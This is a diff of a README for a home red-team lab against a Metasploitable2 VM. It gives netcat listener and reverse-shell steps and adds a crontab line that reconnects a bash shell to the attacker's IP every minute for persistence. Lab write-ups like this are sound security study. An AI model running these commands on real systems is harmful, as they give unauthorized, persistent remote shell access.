@@ -10,11 +10,13 @@ IP: 192.168.56.101
 Attacker (Kali) IP: 192.168.56.102
 
 ## Exploitation Steps
+
 🔹 Step 1: Start a Netcat listener on the attacker (Kali) machine
 bash
 Copy
 Edit
 nc -lvnp 4444
+
 🔹 Step 2: Execute a reverse shell on the victim (Metasploitable2)
 bash
 Copy
@@ -31,31 +33,31 @@ Edit
 whoami
 hostid
 ip a
-## Persistence via Crontab
+
+Persistence via Crontab
 🔹 Step 4: Edit crontab on Metasploitable2
 bash
 Copy
 Edit
 crontab -e
+
 🔹 Step 5: Add the following line to create a persistent reverse shell every minute:
 bash
 Copy
 Edit
 * * * * * nc -e /bin/bash 192.168.56.102 4444
-## Screenshots (click to view)
-Upload the following to GitHub and link them with ![](url) markdown syntax
+    
+## Screenshots
 
-Netcat listener setup
+![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab07/Screen%20Shot%202025-06-08%20at%2017.02.43.png)
 
-Reverse shell received
+![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab07/Screen%20Shot%202025-06-08%20at%2017.26.30.png)
 
-Command outputs (whoami, hostid, ip a)
+![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab07/Screen%20Shot%202025-06-08%20at%2017.45.13.png)
 
-Crontab modification screen
+![](https://github.com/ATTezel/RedTeam-Labs/blob/main/Lab07/Screen%20Shot%202025-06-08%20at%2017.45.54.png)
 
-Reconnected shell via crontab
-
-🧠 What I Learned
+## What I Learned
 How reverse shells work with Netcat (nc -e /bin/bash)
 
 The concept of incoming vs outgoing connections and attacker-listener logic
